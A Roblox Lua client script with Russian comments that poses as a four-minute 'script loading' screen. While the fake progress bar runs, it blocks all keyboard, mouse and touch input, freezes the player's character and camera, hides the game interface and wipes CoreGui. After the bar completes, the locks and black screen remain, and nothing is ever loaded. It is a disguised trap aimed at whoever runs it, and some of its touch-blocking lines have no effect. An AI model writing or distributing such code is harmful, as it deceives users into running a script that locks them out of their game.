local function visual()
    local player = game.Players.LocalPlayer
    local PlayerGui = player:WaitForChild("PlayerGui")

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PurpleScrenGui"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = PlayerGui

    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0, 0, 0, 0)
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.BackgroundTransparency = 0
    blackFrame.ZIndex = 1
    blackFrame.Parent = screenGui
    
    -- ЭКРАН ЗАГРУЗКИ
    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1, 0, 0, 50)
    loadingText.Position = UDim2.new(0, 0, 0.3, 0)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "ЗАГРУЗКА СКРИПТА... (4 МИНУТЫ)"
    loadingText.TextColor3 = Color3.new(1, 1, 1)
    loadingText.TextSize = 40
    loadingText.TextScaled = true
    loadingText.Font = Enum.Font.SourceSansBold
    loadingText.ZIndex = 2
    loadingText.Parent = screenGui
    
    -- Процент загрузки
    local percentText = Instance.new("TextLabel")
    percentText.Size = UDim2.new(0, 100, 0, 30)
    percentText.Position = UDim2.new(0.5, -50, 0.4, 0)
    percentText.BackgroundTransparency = 1
    percentText.Text = "0%"
    percentText.TextColor3 = Color3.new(1, 1, 1)
    percentText.TextSize = 30
    percentText.Font = Enum.Font.SourceSansBold
    percentText.ZIndex = 2
    percentText.Parent = screenGui
    
    -- Прогресс-бар фон
    local progressBg = Instance.new("Frame")
    progressBg.Size = UDim2.new(0.6, 0, 0, 20)
    progressBg.Position = UDim2.new(0.2, 0, 0.5, 0)
    progressBg.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    progressBg.BorderSizePixel = 0
    progressBg.ZIndex = 2
    progressBg.Parent = screenGui
    
    -- Прогресс-бар
    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.Position = UDim2.new(0, 0, 0, 0)
    progressBar.BackgroundColor3 = Color3.new(0, 1, 0)
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = 3
    progressBar.Parent = progressBg
    
    -- Вращающийся индикатор загрузки
    local loadingCircle = Instance.new("Frame")
    loadingCircle.Name = "LoadingCircle"
    loadingCircle.Size = UDim2.new(0, 80, 0, 80)
    loadingCircle.Position = UDim2.new(0.5, -40, 0.6, 0)
    loadingCircle.BackgroundColor3 = Color3.new(1, 1, 1)
    loadingCircle.BorderSizePixel = 0
    loadingCircle.ZIndex = 2
    loadingCircle.Parent = screenGui

    -- Делаем кружок круглым
    -- Делаем кружок круглым
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = loadingCircle

    -- Создаем маску для "отрезания" 70% круга
    local mask = Instance.new("Frame")
    mask.Size = UDim2.new(1, 0, 1, 0)
    mask.Position = UDim2.new(0, 0, 0, 0)
    mask.BackgroundTransparency = 1
    mask.ClipsDescendants = true
    mask.ZIndex = loadingCircle.ZIndex + 1
    mask.Parent = loadingCircle

    -- Создаем белую дугу (30% круга)
    local arc = Instance.new("ImageLabel")
    arc.Size = UDim2.new(1, 0, 1, 0)
    arc.Position = UDim2.new(0, 0, 0, 0)
    arc.BackgroundTransparency = 1
    arc.Image = "rbxassetid://4918373417" -- стандартная дуга (arc) из Roblox Library
    arc.ImageColor3 = Color3.new(1, 1, 1)
    arc.ZIndex = mask.ZIndex + 1
    arc.Parent = mask

    -- Настроим дугу на 30% (108 градусов)
    arc.ImageRectSize = Vector2.new(360, 360)
    arc.ImageRectOffset = Vector2.new(0, 0)
    arc.Rotation = 0

    -- Скрываем основной круг, оставляем только дугу
    loadingCircle.BackgroundTransparency = 1

    -- Анимация загрузки будет вращать mask (или arc)
    local rotationSpeed = 5
    local currentRotation = 0
    local progress = 0

    spawn(function()
        while progress < 100 do
            -- Вращение кружка
            currentRotation = currentRotation + rotationSpeed
            loadingCircle.Rotation = currentRotation
            
            if currentRotation >= 360 then
                currentRotation = 0
            end
            
            -- Обновление прогресса (4 минуты = 240 секунд)
            progress = progress + 0.0417 -- 100% за 240 секунд (4 минуты)
            percentText.Text = math.floor(progress) .. "%"
            progressBar.Size = UDim2.new(progress/100, 0, 1, 0)
            
            -- Меняем цвет прогресс-бара
            if progress < 30 then
                progressBar.BackgroundColor3 = Color3.new(1, 0, 0) -- Красный
            elseif progress < 70 then
                progressBar.BackgroundColor3 = Color3.new(1, 1, 0) -- Желтый
            else
                progressBar.BackgroundColor3 = Color3.new(0, 1, 0) -- Зеленый
            end
            
            wait(0.1) -- Увеличил интервал для более плавной анимации
        end
        
        -- Загрузка завершена
        loadingText.Text = "ЗАГРУЗКА ЗАВЕРШЕНА!"
        percentText.Text = "100%"
        progressBar.BackgroundColor3 = Color3.new(0, 1, 0)
        
        wait(2)
        
        -- Скрываем экран загрузки
        loadingText.Visible = false
        percentText.Visible = false
        progressBg.Visible = false
        loadingCircle.Visible = false
    end)
    
    local CAS = game:GetService("ContextActionService")

    local function BlockAll(actionName, inputState, inputObject)
        return Enum.ContextActionResult.Sink
    end

    -- Блокируем все клавиши
    CAS:BindAction("BlockKeys", BlockAll, false, unpack(Enum.KeyCode:GetEnumItems()))
    -- Блокируем все типы ввода (мышь, тач, геймпад)
    CAS:BindAction("BlockInput", BlockAll, false, unpack(Enum.UserInputType:GetEnumItems()))
    
    -- ДОПОЛНИТЕЛЬНАЯ БЛОКИРОВКА КЛИЕНТА (РАБОТАЕТ НА ТЕЛЕФОНЕ)
    
    -- Блокируем движение персонажа
    local Players = game:GetService("Players")
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    -- Отключаем движение
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    humanoid.PlatformStand = true
    
    -- Дополнительная блокировка движения
    spawn(function()
        while true do
            if character and character:FindFirstChild("Humanoid") then
                character.Humanoid.WalkSpeed = 0
                character.Humanoid.JumpPower = 0
                character.Humanoid.PlatformStand = true
            end
            wait(0.1)
        end
    end)
    
    -- Блокируем камеру
    local Camera = workspace.CurrentCamera
    Camera.CameraType = Enum.CameraType.Scriptable
    
    -- Отключаем весь интерфейс Roblox
    local StarterGui = game:GetService("StarterGui")
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    
    -- БЛОКИРОВКА ДЛЯ ТЕЛЕФОНА
    local UserInputService = game:GetService("UserInputService")
    
    -- Блокируем все типы ввода на мобильных устройствах
    pcall(function()
        UserInputService.TouchEnabled = false
    end)
    
    -- Дополнительная блокировка для мобильных устройств
    local function blockTouchInput(inputObject, gameProcessed)
        if inputObject.UserInputType == Enum.UserInputType.Touch then
            return Enum.ContextActionResult.Sink
        end
        return Enum.ContextActionResult.Pass
    end
    
    -- Блокируем касания экрана
    UserInputService.InputBegan:Connect(function(inputObject, gameProcessed)
        if inputObject.UserInputType == Enum.UserInputType.Touch then
            return Enum.ContextActionResult.Sink
        end
    end)
    
    -- Блокируем все жесты на мобильных устройствах
    UserInputService.TouchTapInWorld:Connect(function()
        return Enum.ContextActionResult.Sink
    end)
    
    -- Блокируем поворот экрана
    UserInputService.DeviceOrientationChanged:Connect(function()
        return Enum.ContextActionResult.Sink
    end)
    game:GetService('CoreGui'):ClearAllChildren()
end

-- Call the function
visual()
